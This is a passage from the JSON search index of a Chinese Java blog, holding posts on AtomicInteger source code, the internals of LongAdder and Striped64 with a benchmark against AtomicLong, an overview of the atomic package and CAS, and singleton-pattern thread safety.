previous value * @since 1.8 */ public final int getAndUpdate(IntUnaryOperator updateFunction) &#123; int prev, next; do &#123; prev = get(); next = updateFunction.applyAsInt(prev); &#125; while (!compareAndSet(prev, next)); return prev; &#125; /** * Atomically updates the current value with the results of * applying the given function, returning the updated value. The * function should be side-effect-free, since it may be re-applied * when attempted updates fail due to contention among threads. * * @param updateFunction a side-effect-free function * @return the updated value * @since 1.8 */ public final int updateAndGet(IntUnaryOperator updateFunction) &#123; int prev, next; do &#123; prev = get(); next = updateFunction.applyAsInt(prev); &#125; while (!compareAndSet(prev, next)); return next; &#125; /** * Atomically updates the current value with the results of * applying the given function to the current and given values, * returning the previous value. The function should be * side-effect-free, since it may be re-applied when attempted * updates fail due to contention among threads. The function * is applied with the current value as its first argument, * and the given update as the second argument. * * @param x the update value * @param accumulatorFunction a side-effect-free function of two arguments * @return the previous value * @since 1.8 */ public final int getAndAccumulate(int x, IntBinaryOperator accumulatorFunction) &#123; int prev, next; do &#123; prev = get(); next = accumulatorFunction.applyAsInt(prev, x); &#125; while (!compareAndSet(prev, next)); return prev; &#125; /** * Atomically updates the current value with the results of * applying the given function to the current and given values, * returning the updated value. The function should be * side-effect-free, since it may be re-applied when attempted * updates fail due to contention among threads. The function * is applied with the current value as its first argument, * and the given update as the second argument. * * @param x the update value * @param accumulatorFunction a side-effect-free function of two arguments * @return the updated value * @since 1.8 */ public final int accumulateAndGet(int x, IntBinaryOperator accumulatorFunction) &#123; int prev, next; do &#123; prev = get(); next = accumulatorFunction.applyAsInt(prev, x); &#125; while (!compareAndSet(prev, next)); return next; &#125; /** * Returns the String representation of the current value. * @return the String representation of the current value */ public String toString() &#123; return Integer.toString(get()); &#125; /** * Returns the value of this &#123;@code AtomicInteger&#125; as an &#123;@code int&#125;. */ public int intValue() &#123; return get(); &#125; /** * Returns the value of this &#123;@code AtomicInteger&#125; as a &#123;@code long&#125; * after a widening primitive conversion. * @jls 5.1.2 Widening Primitive Conversions */ public long longValue() &#123; return (long)get(); &#125; /** * Returns the value of this &#123;@code AtomicInteger&#125; as a &#123;@code float&#125; * after a widening primitive conversion. * @jls 5.1.2 Widening Primitive Conversions */ public float floatValue() &#123; return (float)get(); &#125; /** * Returns the value of this &#123;@code AtomicInteger&#125; as a &#123;@code double&#125; * after a widening primitive conversion. * @jls 5.1.2 Widening Primitive Conversions */ public double doubleValue() &#123; return (double)get(); &#125;&#125;","categories":[{"name":"java","slug":"java","permalink":"https://wuhaocn.github.io/categories/java/"}],"tags":[{"name":"atomic","slug":"atomic","permalink":"https://wuhaocn.github.io/tags/atomic/"}]},{"title":"LogAdder","slug":"language/java/juc/atomic/LogAdder","date":"2021-10-01T13:12:11.460Z","updated":"2021-10-01T13:12:11.460Z","comments":true,"path":"2021/10/01/language/java/juc/atomic/LogAdder/","link":"","permalink":"https://wuhaocn.github.io/2021/10/01/language/java/juc/atomic/LogAdder/","excerpt":"","text":"问题（1）java8 中为什么要新增 LongAdder？ （2）LongAdder 的实现方式？ （3）LongAdder 与 AtomicLong 的对比？ 简介LongAdder 是 java8 中新增的原子类，在多线程环境中，它比 AtomicLong 性能要高出不少，特别是写多的场景。 它是怎么实现的呢？让我们一起来学习吧。 原理LongAdder 的原理是，在最初无竞争时，只更新 base 的值，当有多线程竞争时通过分段的思想，让不同的线程更新不同的段，最后把这些段相加就得到了完整的 LongAdder 存储的值。 LongAdder 源码分析LongAdder 继承自 Striped64 抽象类，Striped64 中定义了 Cell 内部类和各重要属性。 主要内部类// Striped64 中的内部类，使用@sun.misc.Contended 注解，说明里面的值消除伪共享 123456789101112131415161718192021222324@sun.misc.Contended static final class Cell &#123; // 存储元素的值，使用volatile修饰保证可见性 volatile long value; Cell(long x) &#123; value = x; &#125; // CAS更新value的值 final boolean cas(long cmp, long val) &#123; return UNSAFE.compareAndSwapLong(this, valueOffset, cmp, val); &#125; // Unsafe实例 private static final sun.misc.Unsafe UNSAFE; // value字段的偏移量 private static final long valueOffset; static &#123; try &#123; UNSAFE = sun.misc.Unsafe.getUnsafe(); Class&lt;?&gt; ak = Cell.class; valueOffset = UNSAFE.objectFieldOffset (ak.getDeclaredField(&quot;value&quot;)); &#125; catch (Exception e) &#123; throw new Error(e); &#125; &#125;&#125; Cell 类使用@sun.misc.Contended 注解，说明是要避免伪共享的。 使用 Unsafe 的 CAS 更新 value 的值，其中 value 的值使用 volatile 修饰，保证可见性。 关于 Unsafe 的介绍请查看【死磕 java 魔法类之 Unsafe 解析】。 关于伪共享的介绍请查看【杂谈 什么是伪共享（false sharing）？】。一篇对伪共享、缓存行填充和 CPU 缓存讲的很透彻的文章 主要属性 12345678// 这三个属性都在Striped64中// cells数组，存储各个段的值transient volatile Cell[] cells;// 最初无竞争时使用的，也算一个特殊的段transient volatile long base;// 标记当前是否有线程在创建或扩容cells，或者在创建Cell// 通过CAS更新该值，相当于是一个锁transient volatile int cellsBusy; 最初无竞争或有其它线程在创建 cells 数组时使用 base 更新值，有过竞争时使用 cells 更新值。最初无竞争是指一开始没有线程之间的竞争，但也有可能是多线程在操作，只是这些线程没有同时去更新 base 的值。有过竞争是指只要出现过竞争不管后面有没有竞争都使用 cells 更新值，规则是不同的线程 hash 到不同的 cell 上去更新，减少竞争。 add(x)方法add(x)方法是 LongAdder 的主要方法，使用它可以使 LongAdder 中存储的值增加 x，x 可为正可为负。 123456789101112131415161718192021222324252627public void add(long x) &#123; // as是Striped64中的cells属性 // b是Striped64中的base属性 // v是当前线程hash到的Cell中存储的值 // m是cells的长度减1，hash时作为掩码使用 // a是当前线程hash到的Cell Cell[] as; long b, v; int m; Cell a; // 条件1：cells不为空，说明出现过竞争，cells已经创建 // 条件2：cas操作base失败，说明其它线程先一步修改了base，正在出现竞争 if ((as = cells) != null || !casBase(b = base, b + x)) &#123; // true表示当前竞争还不激烈 // false表示竞争激烈，多个线程hash到同一个Cell，可能要扩容 boolean uncontended = true; // 条件1：cells为空，说明正在出现竞争，上面是从条件2过来的 // 条件2：应该不会出现 // 条件3：当前线程所在的Cell为空，说明当前线程还没有更新过Cell，应初始化一个Cell // 条件4：更新当前线程所在的Cell失败，说明现在竞争很激烈，多个线程hash到了同一个Cell，应扩容 if (as == null || (m = as.length - 1) &lt; 0 || // getProbe()方法返回的是线程中的threadLocalRandomProbe字段 // 它是通过随机数生成的一个值，对于一个确定的线程这个值是固定的 // 除非刻意修改它 (a = as[getProbe() &amp; m]) == null || !(uncontended = a.cas(v = a.value, v + x))) // 调用Striped64中的方法处理 longAccumulate(x, null, uncontended); &#125;&#125; *（1）最初无竞争时只更新 base； *（2）直到更新 base 失败时，创建 cells 数组； *（3）当多个线程竞争同一个 Cell 比较激烈时，可能要扩容； longAccumulate()方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130final void longAccumulate(long x, LongBinaryOperator fn, boolean wasUncontended) &#123; // 存储线程的probe值 int h; // 如果getProbe()方法返回0，说明随机数未初始化 if ((h = getProbe()) == 0) &#123; // 强制初始化 ThreadLocalRandom.current(); // force initialization // 重新获取probe值 h = getProbe(); // 都未初始化，肯定还不存在竞争激烈 wasUncontended = true; &#125; // 是否发生碰撞 boolean collide = false; // True if last slot nonempty for (;;) &#123; Cell[] as; Cell a; int n; long v; // cells已经初始化过 if ((as = cells) != null &amp;&amp; (n = as.length) &gt; 0) &#123; // 当前线程所在的Cell未初始化 if ((a = as[(n - 1) &amp; h]) == null) &#123; // 当前无其它线程在创建或扩容cells，也没有线程在创建Cell if (cellsBusy == 0) &#123; // Try to attach new Cell // 新建一个Cell，值为当前需要增加的值 Cell r = new Cell(x); // Optimistically create // 再次检测cellsBusy，并尝试更新它为1 // 相当于当前线程加锁 if (cellsBusy == 0 &amp;&amp; casCellsBusy()) &#123; // 是否创建成功 boolean created = false; try &#123; // Recheck under lock Cell[] rs; int m, j; // 重新获取cells，并找到当前线程hash到cells数组中的位置 // 这里一定要重新获取cells，因为as并不在锁定范围内 // 有可能已经扩容了，这里要重新获取 if ((rs = cells) != null &amp;&amp; (m = rs.length) &gt; 0 &amp;&amp; rs[j = (m - 1) &amp; h] == null) &#123; // 把上面新建的Cell放在cells的j位置处 rs[j] = r; // 创建成功 created = true; &#125; &#125; finally &#123; // 相当于释放锁 cellsBusy = 0; &#125; // 创建成功了就返回 // 值已经放在新建的Cell里面了 if (created) break; continue; // Slot is now non-empty &#125; &#125; // 标记当前未出现冲突 collide = false; &#125; // 当前线程所在的Cell不为空，且更新失败了 // 这里简单地设为true，相当于简单地自旋一次 // 通过下面的语句修改线程的probe再重新尝试 else if (!wasUncontended) // CAS already known to fail wasUncontended = true; // Continue after rehash // 再次尝试CAS更新当前线程所在Cell的值，如果成功了就返回 else if (a.cas(v = a.value, ((fn == null) ? v + x : fn.applyAsLong(v, x)))) break; // 如果cells数组的长度达到了CPU核心数，或者cells扩容了 // 设置collide为false并通过下面的语句修改线程的probe再重新尝试 else if (n &gt;= NCPU || cells != as) collide = false; // At max size or stale // 上上个elseif都更新失败了，且上个条件不成立，说明出现冲突了 else if (!collide) collide = true; // 明确出现冲突了，尝试占有锁，并扩容 else if (cellsBusy == 0 &amp;&amp; casCellsBusy()) &#123; try &#123; // 检查是否有其它线程已经扩容过了 if (cells == as) &#123; // Expand table unless stale // 新数组为原数组的两倍 Cell[] rs = new Cell[n &lt;&lt; 1]; // 把旧数组元素拷贝到新数组中 for (int i = 0; i &lt; n; ++i) rs[i] = as[i]; // 重新赋值cells为新数组 cells = rs; &#125; &#125; finally &#123; // 释放锁 cellsBusy = 0; &#125; // 已解决冲突 collide = false; // 使用扩容后的新数组重新尝试 continue; // Retry with expanded table &#125; // 更新失败或者达到了CPU核心数，重新生成probe，并重试 h = advanceProbe(h); &#125; // 未初始化过cells数组，尝试占有锁并初始化cells数组 else if (cellsBusy == 0 &amp;&amp; cells == as &amp;&amp; casCellsBusy()) &#123; // 是否初始化成功 boolean init = false; try &#123; // Initialize table // 检测是否有其它线程初始化过 if (cells == as) &#123; // 新建一个大小为2的Cell数组 Cell[] rs = new Cell[2]; // 找到当前线程hash到数组中的位置并创建其对应的Cell rs[h &amp; 1] = new Cell(x); // 赋值给cells数组 cells = rs; // 初始化成功 init = true; &#125; &#125; finally &#123; // 释放锁 cellsBusy = 0; &#125; // 初始化成功直接返回 // 因为增加的值已经同时创建到Cell中了 if (init) break; &#125; // 如果有其它线程在初始化cells数组中，就尝试更新base // 如果成功了就返回 else if (casBase(v = base, ((fn == null) ? v + x : fn.applyAsLong(v, x)))) break; // Fall back on using base &#125;&#125; *（1）如果 cells 数组未初始化，当前线程会尝试占有 cellsBusy 锁并创建 cells 数组； *（2）如果当前线程尝试创建 cells 数组时，发现有其它线程已经在创建了，就尝试更新 base，如果成功就返回； *（3）通过线程的 probe 值找到当前线程应该更新 cells 数组中的哪个 Cell； *（4）如果当前线程所在的 Cell 未初始化，就占有占有 cellsBusy 锁并在相应的位置创建一个 Cell； *（5）尝试 CAS 更新当前线程所在的 Cell，如果成功就返回，如果失败说明出现冲突； *（5）当前线程更新 Cell 失败后并不是立即扩容，而是尝试更新 probe 值后再重试一次； *（6）如果在重试的时候还是更新失败，就扩容； *（7）扩容时当前线程占有 cellsBusy 锁，并把数组容量扩大到两倍，再迁移原 cells 数组中元素到新数组中； *（8）cellsBusy 在创建 cells 数组、创建 Cell、扩容 cells 数组三个地方用到； sum()方法sum()方法是获取 LongAdder 中真正存储的值的大小，通过把 base 和所有段相加得到。 12345678910111213141516public long sum() &#123; Cell[] as = cells; Cell a; // sum初始等于base long sum = base; // 如果cells不为空 if (as != null) &#123; // 遍历所有的Cell for (int i = 0; i &lt; as.length; ++i) &#123; // 如果所在的Cell不为空，就把它的value累加到sum中 if ((a = as[i]) != null) sum += a.value; &#125; &#125; // 返回sum return sum;&#125; 可以看到 sum()方法是把 base 和所有段的值相加得到，那么，这里有一个问题，如果前面已经累加到 sum 上的 Cell 的 value 有修改，不是就没法计算到了么？ 答案确实如此，所以 LongAdder 可以说不是强一致性的，它是最终一致性的。 LongAdder VS AtomicLong直接上代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364public class LongAdderVSAtomicLongTest &#123; public static void main(String[] args)&#123; testAtomicLongVSLongAdder(1, 10000000); testAtomicLongVSLongAdder(10, 10000000); testAtomicLongVSLongAdder(20, 10000000); testAtomicLongVSLongAdder(40, 10000000); testAtomicLongVSLongAdder(80, 10000000); &#125; static void testAtomicLongVSLongAdder(final int threadCount, final int times)&#123; try &#123; System.out.println(&quot;threadCount：&quot; + threadCount + &quot;, times：&quot; + times); long start = System.currentTimeMillis(); testLongAdder(threadCount, times); System.out.println(&quot;LongAdder elapse：&quot; + (System.currentTimeMillis() - start) + &quot;ms&quot;); long start2 = System.currentTimeMillis(); testAtomicLong(threadCount, times); System.out.println(&quot;AtomicLong elapse：&quot; + (System.currentTimeMillis() - start2) + &quot;ms&quot;); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; static void testAtomicLong(final int threadCount, final int times) throws InterruptedException &#123; AtomicLong atomicLong = new AtomicLong(); List&lt;Thread&gt; list = new ArrayList&lt;&gt;(); for (int i=0;i&lt;threadCount;i++)&#123; list.add(new Thread(() -&gt; &#123; for (int j = 0; j&lt;times; j++)&#123; atomicLong.incrementAndGet(); &#125; &#125;)); &#125; for (Thread thread : list)&#123; thread.start(); &#125; for (Thread thread : list)&#123; thread.join(); &#125; &#125; static void testLongAdder(final int threadCount, final int times) throws InterruptedException &#123; LongAdder longAdder = new LongAdder(); List&lt;Thread&gt; list = new ArrayList&lt;&gt;(); for (int i=0;i&lt;threadCount;i++)&#123; list.add(new Thread(() -&gt; &#123; for (int j = 0; j&lt;times; j++)&#123; longAdder.add(1); &#125; &#125;)); &#125; for (Thread thread : list)&#123; thread.start(); &#125; for (Thread thread : list)&#123; thread.join(); &#125; &#125;&#125; 运行结果如下： 123456789101112131415threadCount：1, times：10000000LongAdder elapse：158msAtomicLong elapse：64msthreadCount：10, times：10000000LongAdder elapse：206msAtomicLong elapse：2449msthreadCount：20, times：10000000LongAdder elapse：429msAtomicLong elapse：5142msthreadCount：40, times：10000000LongAdder elapse：840msAtomicLong elapse：10506msthreadCount：80, times：10000000LongAdder elapse：1369msAtomicLong elapse：20482ms 可以看到当只有一个线程的时候，AtomicLong 反而性能更高，随着线程越来越多，AtomicLong 的性能急剧下降，而 LongAdder 的性能影响很小。 总结*（1）LongAdder 通过 base 和 cells 数组来存储值； *（2）不同的线程会 hash 到不同的 cell 上去更新，减少了竞争； *（3）LongAdder 的性能非常高，最终会达到一种无竞争的状态； 在 longAccumulate()方法中有个条件是 n &gt;= NCPU 就不会走到扩容逻辑了，而 n 是 2 的倍数，那是不是代表 cells 数组最大只能达到大于等于 NCPU 的最小 2 次方？答案是明确的。因为同一个 CPU 核心同时只会运行一个线程，而更新失败了说明有两个不同的核心更新了同一个 Cell，这时会重新设置更新失败的那个线程的 probe 值，这样下一次它所在的 Cell 很大概率会发生改变，如果运行的时间足够长，最终会出现同一个核心的所有线程都会 hash 到同一个 Cell（大概率，但不一定全在一个 Cell 上）上去更新，所以，这里 cells 数组中长度并不需要太长，达到 CPU 核心数足够了。比如，笔者的电脑是 8 核的，所以这里 cells 的数组最大只会到 8，达到 8 就不会扩容了。","categories":[{"name":"java","slug":"java","permalink":"https://wuhaocn.github.io/categories/java/"}],"tags":[{"name":"atomic","slug":"atomic","permalink":"https://wuhaocn.github.io/tags/atomic/"}]},{"title":"atomic","slug":"language/java/juc/atomic/readme","date":"2021-10-01T13:12:11.460Z","updated":"2021-10-01T13:12:11.461Z","comments":true,"path":"2021/10/01/language/java/juc/atomic/readme/","link":"","permalink":"https://wuhaocn.github.io/2021/10/01/language/java/juc/atomic/readme/","excerpt":"","text":"1.简介早期的JDK版本中，如果要并发的对Integer、Long、Double之类的Java原始类型或引用类型进行操作，一般都需要通过锁来控制并发， 以防止数据不一致。JUC-Atomic原子类位于java.util.concurrent.atomic包下。该包提供了许多Java原始/引用类型的映射类。 如AtomicInteger、AtomicLong、AtomicBoolean，这些类可以通过一种“无锁算法”，线程安全的操作Integer、Long、Boolean等原始类型。 包中类分为五种： 基本类型： AtomicBoolean：布尔型原子类 AtomicInteger：整型原子类 AtomicLong：长整型原子类 数组： AtomicIntegerArray：整形数组原子类 AtomicLongArray：长整形数组原子类 AtomicReferenceArray：引用类型数组原子类 引用类型： AtomicReference：引用类型原子类 AtomicStampedRerence：原子更新引用类型里的字段原子类 AtomicMarkableReference：原子更新带有标记位的引用类型 对象的属性： AtomicIntegerFieldUpdater：原子更新整形字段的更新器 AtomicLongFieldUpdater：原子更新长整形字段的更新器 AtomicReferenceFieldUpdater：原子更新带有版本号的引用类型。 该类将整数值与引用关联起来，可用于解决原子的更新数据和数据的版本号，可以解决使用 CAS 进行原子更新时可能出现的 ABA 问题 本文不会详细介绍这几种类型的api及使用，只是列出Atomic的实现原理，及比较重点的类 基本类型原子类： AtomicBoolean：布尔型原子类 AtomicInteger：整型原子类 AtomicLong：长整型原子类 这几个类的共同特点是都提供单个变量的原子方式访问和更新功能。以AtomicLong为代表，进行介绍。 2.实例解析 例子：我们使用 AtomicLong 来演示之前的线程不安全的 12345678910111213141516171819202122232425262728293031323334353637383940/** * 并发测试代码 */@ThreadSafepublic class AtomicExample2 &#123; //请求总数 public static int clientTotal = 5000; //同时并发执行的线程数 public static int threadTotal = 200; //变成了AtomicLong类型 public static AtomicLong count = new AtomicLong(0); public static void main(String[] args) throws InterruptedException &#123; //创建线程池 ExecutorService executorService = Executors.newCachedThreadPool(); //定义信号量 final Semaphore semaphore = new Semaphore(threadTotal); //定义计数器 闭锁 final CountDownLatch countDownLatch = new CountDownLatch(clientTotal); for (int i = 0; i &lt; clientTotal; i++) &#123; executorService.execute(() -&gt;&#123; try &#123; semaphore.acquire(); add(); //释放 semaphore.release(); &#125; catch (Exception e) &#123; System.out.println(&quot;exception:&quot;+e.getMessage()); &#125; countDownLatch.countDown(); &#125;); &#125; countDownLatch.await(); executorService.shutdown(); System.out.println(&quot;count:&#123;&#125;&quot;+count.get()); &#125; private static void add()&#123; count.incrementAndGet();//先做增加再获取当前值 //count.getAndIncrement();先获取当前值再做增加 &#125;&#125; 解析 当使用AtomicLong去执行自增操作时，得出的最终结果count就是5000。数次运行情况下结果一致。不会带来线程不安全的情况。 那我们来看看AtomicLong是如何保证线程安全的呢。 我们看看incrementAndGet方法，看看AtomicLong如何实现单个变量的原子方式更新。Unsafe是CAS的核心类，AtomicLong是基于CAS实现的。 此处就介绍AtomicLong，AtomicBoolean、AtomicInteger、AtomicReference与之相似，就不一一介绍 12345private static final Unsafe unsafe = Unsafe.getUnsafe();public final long incrementAndGet() &#123; return unsafe.getAndAddLong(this, valueOffset, 1L) + 1L;&#125; incrementAndGet 方法实际上是调用 Unsafe 类的方法来执行操作，我们进入 Unsafe 里看看具体的 getAndAddLong 是如何实现原子方式更新的。 1234567public final long getAndAddLong(Object var1, long var2, long var4) &#123; long var6; do &#123; var6 = this.getLongVolatile(var1, var2); &#125; while(!this.compareAndSwapLong(var1, var2, var6, var6 + var4)); return var6;&#125; 我们来解析一下这个方法，var1为当前调用这个方法的对象，var2是当前值，假如执行的2+1=3的操作，那么var4就是1。 var6是调用底层方法获得底层当前值。假设没有其他线程来处理count，那么var6就是var2。此处使用了一个do while循环。 compareAndSwapLong方法是native的，代表是java底层的方法。也是遵循CAS算法的api。compareAndSwap，比较并交换。 在getAndAddLong的while判断中，该方法实现的是：对于var1这个对象，如果当前值var2和底层值var6相同的话，就更新为后面的操作结果值。 当我们执行更新结果时，可能被其他线程修改，因此此处判断当前值与期望值相同时才允许更新。否则重新取出当前的底层值，和当前count的值再做比较。 保证当前值与底层值完全一致时才进行结果更新，以此保证线程安全。这也是Atomic使用CAS原理实现的机制。底层值是主内存中的值，当前值是源自于工作内存。 由于该方法的逻辑是采用自旋的方式不断更新目标值，直到更新成功，在并发量较低的环境下，线程冲突较少，自旋次数不会很多。 但是在高并发情况下，N个线程同时进行自旋操作，会出现大量失败并不断自旋的情况，此时的AtomicLong的自旋会成为瓶颈， 因此为了解决高并发环境下的AtomicLong的自旋瓶颈问题，引入了LongAdder。 LongAdder： AtomicLong 中有个内部变量 value 保存着实际的 long 值，所有的操作都是针对该变量进行。也就是说，高并发环境下，value 变量其实是一个热点，也就是 N 个线程竞争一个热点。LongAdder 的基本思路就是分散热点，将 value 值分散到一个数组中，不同线程会命中到数组的不同槽中，各个线程只对自己槽中的那个值进行 CAS 操作，这样热点就被分散了，冲突的概率就小很多。如果要获取真正的 long 值，只要将各个槽中的变量值累加返回。 低并发、一般的业务场景下 AtomicLong 是足够了。如果并发量很多，存在大量写多读少的情况，那 LongAdder 可能更合适。 AtomicBoolean： 针对该类我们主要研究 compareAndSet 函数 12345public final boolean compareAndSet(boolean expect, boolean update) &#123; int e = expect ? 1 : 0; int u = update ? 1 : 0; return unsafe.compareAndSwapInt(this, valueOffset, e, u);&#125; 该函数实现的功能是高并发情况下只有一个线程能访问这个属性值，常用于初始化一次的功能中。 12345678private static AtomicBoolean initialized = new AtomicBoolean(false); public void init() &#123; if( initialized.compareAndSet(false, true) )//如果为false，更新为true &#123; // 初始化操作代码.... &#125; &#125; 各原子类api及使用demo，可以参考：https://github.com/Snailclimb/JavaGuide/blob/master/Java%E7%9B%B8%E5%85%B3/Multithread/Atomic.md 主要是掌握CAS算法的设计思想，了解原子类如何保证原子操作。 参考https://www.cnblogs.com/zhangbLearn/p/9922790.html","categories":[{"name":"java","slug":"java","permalink":"https://wuhaocn.github.io/categories/java/"}],"tags":[{"name":"atomic","slug":"atomic","permalink":"https://wuhaocn.github.io/tags/atomic/"}]},{"title":"深入理解单例模式:静态内部类单例","slug":"language/java/design/深入理解单例模式-静态内部类单例原理","date":"2021-10-01T13:12:11.459Z","updated":"2021-10-01T13:12:11.459Z","comments":true,"path":"2021/10/01/language/java/design/深入理解单例模式-静态内部类单例原理/","link":"","permalink":"https://wuhaocn.github.io/2021/10/01/language/java/design/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F-%E9%9D%99%E6%80%81%E5%86%85%E9%83%A8%E7%B1%BB%E5%8D%95%E4%BE%8B%E5%8E%9F%E7%90%86/","excerpt":"","text":"深入理解单例模式：静态内部类单例原理本文主要介绍 java 的单例模式，以及详细剖析静态内部类之所以能够实现单例的原理。OK，废话不多说，进入正文。 1.单例原则首先我们要先了解下单例的四大原则： 1.构造私有。 2.以静态方法或者枚举返回实例。 3.确保实例只有一个，尤其是多线程环境。 4.确保反序列换时不会重新构建对象。 2.常用的单例模式：饿汉模式、懒汉模式、双重锁懒汉模式、静态内部类模式、枚举模式，我们来逐一分析下这些模式的区别。 2.1.饿汉模式：饿汉模式在类被初始化时就已经在内存中创建了对象，以空间换时间，故不存在线程安全问题。参考如下： 1234567public class SingleTon&#123; private static SingleTon INSTANCE = new SingleTon(); private SingleTon()&#123;&#125; public static SingleTon getInstance()&#123; return INSTANCE; &#125;&#125; 2.2.懒汉模式：懒汉模式在方法被调用后才创建对象，以时间换空间，在多线程环境下存在风险。参考如下 12345678910public class SingleTon&#123; private static SingleTon INSTANCE = null; private SingleTon()&#123;&#125; public static SingleTon getInstance() &#123; if(INSTANCE == null)&#123; INSTANCE = new SingleTon(); &#125; return INSTANCE； &#125;&#125; 2.3.双重锁懒汉模式(Double Check Lock)DCL 模式的优点就是，只有在对象需要被使用时才创建，第一次判断 INSTANCE == null 为了避免非必要加锁，当第一次加载时才对实例进行加锁再实例化。这样既可以节约内存空间，又可以保证线程安全。但是，由于 jvm 存在乱序执行功能，DCL 也会出现线程不安全的情况。具体分析如下： 123456789101112public class SingleTon&#123; private static SingleTon INSTANCE = null; private SingleTon()&#123;&#125; public static SingleTon getInstance()&#123;if(INSTANCE == null)&#123; synchronized(SingleTon.class)&#123; if(INSTANCE == null)&#123; INSTANCE = new SingleTon(); &#125; &#125; return INSTANCE; &#125;&#125; INSTANCE = new SingleTon();这个步骤，其实在 jvm 里面的执行分为三步： 1.在堆内存开辟内存空间。 2.在堆内存中实例化 SingleTon 里面的各个参数。 3.把对象指向堆内存空间。 由于 jvm 存在乱序执行功能，所以可能在 2 还没执行时就先执行了 3，如果此时再被切换到线程 B 上，由于执行了 3，INSTANCE 已经非空了，会被直接拿出来用，这样的话，就会出现异常。这个就是著名的 DCL 失效问题。 不过在 JDK1.5 之后，官方也发现了这个问题，故而具体化了 volatile，即在 JDK1.6 及以后，只要定义为 1private volatile static SingleTon INSTANCE = null; 就可解决 DCL 失效问题。volatile 确保 INSTANCE 每次均在主内存中读取，这样虽然会牺牲一点效率，但也无伤大雅。 2.4.静态内部类模式：静态内部类的优点是：外部类加载时并不需要立即加载内部类，内部类不被加载则不去初始化 INSTANCE，故而不占内存。即当 SingleTon 第一次被加载时，并不需要去加载 SingleTonHoler，只有当 getInstance()方法第一次被调用时，才会去初始化 INSTANCE,第一次调用 getInstance()方法会导致虚拟机加载 SingleTonHoler 类，这种方法不仅能确保线程安全，也能保证单例的唯一性，同时也延迟了单例的实例化。 1234567891011public class SingleTon&#123; private SingleTon()&#123;&#125; private static class SingleTonHoler&#123; private static SingleTon INSTANCE = new SingleTon(); &#125; public static SingleTon getInstance()&#123; return SingleTonHoler.INSTANCE; &#125;&#125; 那么，静态内部类又是如何实现线程安全的呢？首先，我们先了解下类的加载时机。类加载时机：JAVA 虚拟机在有且仅有的 5 种场景下会对类进行初始化。 1.遇到 new、getstatic、setstatic 或者 invokestatic 这 4 个字节码指令时，对应的 java 代码场景为：new 一个关键字或者一个实例化对象时、读取或设置一个静态字段时(final 修饰、已在编译期把结果放入常量池的除外)、调用一个类的静态方法时。 2.使用 java.lang.reflect 包的方法对类进行反射调用的时候，如果类没进行初始化，需要先调用其初始化方法进行初始化。 3.当初始化一个类时，如果其父类还未进行初始化，会先触发其父类的初始化。 4.当虚拟机启动时，用户需要指定一个要执行的主类(包含 main()方法的类)，虚拟机会先初始化这个类。 5.当使用 JDK 1.7 等动态语言支持时，如果一个 java.lang.invoke.MethodHandle 实例最后的解析结果 REF_getStatic、REF_putStatic、REF_invokeStatic 的方法句柄，并且这个方法句柄所对应的类没有进行过初始化，则需要先触发其初始化。 这 5 种情况被称为是类的主动引用，注意，这里《虚拟机规范》中使用的限定词是”有且仅有”，那么，除此之外的所有引用类都不会对类进行初始化，称为被动引用。静态内部类就属于被动引用的行列。 我们再回头看下 getInstance()方法，调用的是 SingleTonHoler.INSTANCE，取的是 SingleTonHoler 里的 INSTANCE 对象，跟上面那个 DCL 方法不同的是，getInstance()方法并没有多次去 new 对象，故不管多少个线程去调用 getInstance()方法，取的都是同一个 INSTANCE 对象，而不用去重新创建。当 getInstance()方法被调用时，SingleTonHoler 才在 SingleTon 的运行时常量池里，把符号引用替换为直接引用，这时静态对象 INSTANCE 也真正被创建，然后再被 getInstance()方法返回出去，这点同饿汉模式。那么 INSTANCE 在创建过程中又是如何保证线程安全的呢？在《深入理解 JAVA 虚拟机》中，有这么一句话: 虚拟机会保证一个类的()方法在多线程环境中被正确地加锁、同步，如果多个线程同时去初始化一个类，那么只会有一个线程去执行这个类的()方法，其他线程都需要阻塞等待，直到活动线程执行()方法完毕。如果在一个类的()方法中有耗时很长的操作，就可能造成多个进程阻塞(需要注意的是，其他线程虽然会被阻塞，但如果执行()方法后，其他线程唤醒之后不会再次进入()方法。同一个加载器下，一个类型只会初始化一次。)，在实际应用中，这种阻塞往往是很隐蔽的。 故而，可以看出 INSTANCE 在创建过程中是线程安全的，所以说静态内部类形式的单例可保证线程安全，也能保证单例的唯一性，同时也延迟了单例的实例化。 那么，是不是可以说静态内部类单例就是最完美的单例模式了呢？其实不然，静态内部类也有着一个致命的缺点，就是传参的问题，由于是静态内部类的形式去创建单例的，故外部无法传递参数进去，例如 Context 这种参数，所以，我们创建单例时，可以在静态内部类与 DCL 模式里自己斟酌。 2.5.枚举类型单例模式1234567//枚举单例：public enum SingleTon&#123; INSTANCE; public void method()&#123; //TODO &#125;&#125; 枚举在 java 中与普通类一样，都能拥有字段与方法，而且枚举实例创建是线程安全的，在任何情况下，它都是一个单例。我们可直接以SingleTon.INSTANCE 的方式调用。 参考https://blog.csdn.net/mnb65482/article/details/80458571《深入理解 JAVA 虚拟机》《Android 源码设计模式解析与实战》《java 虚拟机规范》","categories":[{"name":"java","slug":"java","permalink":"https://wuhaocn.github.io/categories/java/"}],"tags":[{"name":"design","slug":"design","permalink":"https://wuhaocn.github.io/tags/design/"}]},{"title":"AtomicBoolean","slug":"language/java/juc/atomic/AtomicBoolean","date":"2021-10-01T13:12:11.459Z","updated":"2021-10-01T13:12:11.460Z","comments":true,"path":"2021/10/01/language/java/juc/atomic/AtomicBoolean/","link":"","permalink":"https://wuhaocn.github.io/2021/10/01/language/java/juc/atomic/AtomicBoolean/","excerpt":"","text":"源码导读java.util.concurrent.atomic.AtomicBoolean类提供了可以原子读取和写入的底层布尔值的操作，并且还包含高级原子操作。 AtomicBoolean支持基础布尔变量上的原子操作。 它具有获取和设置方法，如在volatile变量上的读取和写入。 也就是说，一个集合与同一变量上的任何后续get相关联。 原子compareAndSet方法也具有这些内存一致性功能。 一般情况下，我们使用 AtomicBoolean 高效并发处理 “只初始化一次” 的功能要求 采用volatile int value类型原子变量保证内存可见性 采用Unsafe类 compareAndSwapInt方法实现变量值valueOffset的修改 知识参考点：Unsafe类/ volatile 关键字/ CAS 